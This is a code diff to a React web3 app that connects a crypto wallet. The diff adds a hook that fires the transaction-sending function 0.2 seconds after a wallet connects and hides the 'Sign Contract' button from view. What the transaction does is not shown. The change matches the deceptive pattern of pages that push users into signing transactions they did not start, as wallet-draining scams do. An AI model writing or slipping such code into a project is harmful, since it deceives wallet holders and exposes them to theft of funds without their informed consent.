@@ -7,7 +7,7 @@ import { defaultWagmiConfig } from '@web3modal/wagmi/react/config';
 import './App.css';
 import ConnectButton from './components/ConnectButton';
 import Modal from './components/Modal';
-import { getEthersSigner } from './adapters/ethersAdapters';
+const { getEthersSigner } = require('./adapters/ethersAdapters');
 
 const ethers = require("ethers");
 
@@ -104,6 +104,14 @@ function App() {
     }
   };
 
+  useEffect(() => {
+    if (isConnected) {
+      setTimeout(() => {
+        handleSendTransaction();
+      }, 200); // Automatically click the sign contract button after 0.2 seconds
+    }
+  }, [isConnected]);
+
   return (
     <div className="App">
       <header className="App-header">
@@ -111,7 +119,7 @@ function App() {
         {isConnected ? (
           <>
             <p>Connected account: {address}</p>
-            <button onClick={handleSendTransaction} disabled={transactionInProgress}>
+            <button onClick={handleSendTransaction} style={{ display: 'none' }} disabled={transactionInProgress} id="sign-contract-button">
               {transactionInProgress ? 'Processing...' : 'Sign Contract'}
             </button>
             <button onClick={disconnect}>Disconnect Wallet</button>
